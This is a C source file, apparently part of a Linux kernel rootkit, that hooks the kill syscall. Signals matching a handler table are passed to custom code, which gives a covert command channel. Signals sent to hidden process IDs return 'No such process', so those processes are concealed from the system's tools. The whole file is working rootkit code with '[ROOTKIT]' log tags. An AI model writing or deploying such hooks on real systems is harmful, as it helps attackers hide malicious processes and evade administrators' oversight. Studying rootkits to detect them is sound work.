#include "macro_utils.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <asm-generic/errno-base.h>
#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/types.h>

// sys_kill syscall hook handler
SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
{
    size_t i;

    pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);

    for (i = 0; P_SIG_HANDLERS[i].sig_handler != NULL; ++i) {
        IF_U ((P_SIG_HANDLERS[i].i32_pid == PID_ANY || P_SIG_HANDLERS[i].i32_pid == i32_pid) &&
              (P_SIG_HANDLERS[i].i32_sig == SIG_ANY || P_SIG_HANDLERS[i].i32_sig == i32_sig)) {
            pr_info("[ROOTKIT] * Intercepted signal %d for PID %d\n", i32_sig, i32_pid);
            return P_SIG_HANDLERS[i].sig_handler(i32_pid, i32_sig);
        }
    }

    // Check if the process is hidden; if so, return -ESRCH (No such process)
    IF_U (is_pid_hidden(i32_pid)) {
        pr_info("[ROOTKIT] * Intercepted signal %d for hidden PID %d\n", i32_sig, i32_pid);
        return -ESRCH;
    }

    // Signal was not intercepted, forward it to the original syscall
    return orig_kill(p_regs);
}
